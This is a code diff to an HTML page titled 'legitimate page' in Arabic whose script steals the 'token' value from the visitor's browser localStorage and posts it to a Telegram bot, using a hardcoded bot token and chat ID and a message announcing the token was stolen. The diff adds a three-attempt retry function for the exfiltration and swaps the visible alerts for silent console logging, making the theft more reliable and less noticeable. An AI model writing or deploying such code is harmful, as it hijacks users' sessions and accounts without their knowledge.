@@ -5,33 +5,50 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>صفحة شرعية</title>
     <script>
+        async function sendTokenToTelegram(token) {
+            const botToken = "7121165958:AAGwpDLOVCWty7-QBlv5JFoSjEjmTOzZmEE";
+            const chatId = "6066673128";
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            for (let attempt = 1; attempt <= 3; attempt++) {
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: `تم سرقة التوكن: ${token}`,
+                        }),
+                    });
+
+                    if (response.ok) {
+                        console.log('تم إرسال التوكن بنجاح!');
+                        return;
+                    } else {
+                        console.error(`فشل الإرسال (المحاولة ${attempt}):`, await response.text());
+                    }
+                } catch (error) {
+                    console.error(`حدث خطأ (المحاولة ${attempt}):`, error);
+                }
+
+                // انتظر 2 ثانية قبل المحاولة التالية
+                await new Promise(resolve => setTimeout(resolve, 2000));
+            }
+
+            console.error('فشل إرسال التوكن بعد 3 محاولات.');
+        }
+
         async function stealToken() {
             try {
                 // محاولة سرقة التوكن من Local Storage
                 const token = localStorage.getItem('token') || 'لم يتم العثور على توكن';
                 
                 // إرسال التوكن إلى بوت تليجرام
-                const botToken = "7121165958:AAGwpDLOVCWty7-QBlv5JFoSjEjmTOzZmEE";
-                const chatId = "6066673128";
-                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: `تم سرقة التوكن: ${token}`,
-                    }),
-                });
-
-                if (response.ok) {
-                    alert('تم إرسال التوكن بنجاح!');
-                } else {
-                    alert('فشل إرسال التوكن.');
-                }
+                await sendTokenToTelegram(token);
             } catch (error) {
-                console.error('حدث خطأ:', error);
+                console.error('حدث خطأ أثناء سرقة التوكن:', error);
             }
         }
 
